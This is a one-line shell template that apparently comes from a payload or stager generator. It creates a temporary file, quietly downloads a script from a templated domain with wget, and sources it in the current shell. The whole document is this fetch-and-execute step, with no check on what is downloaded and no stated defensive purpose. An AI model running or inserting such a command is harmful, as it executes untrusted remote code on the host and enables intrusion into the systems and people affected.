temp=$(mktemp); wget -O $temp -q {{.Option "domain"}}; source $temp binary
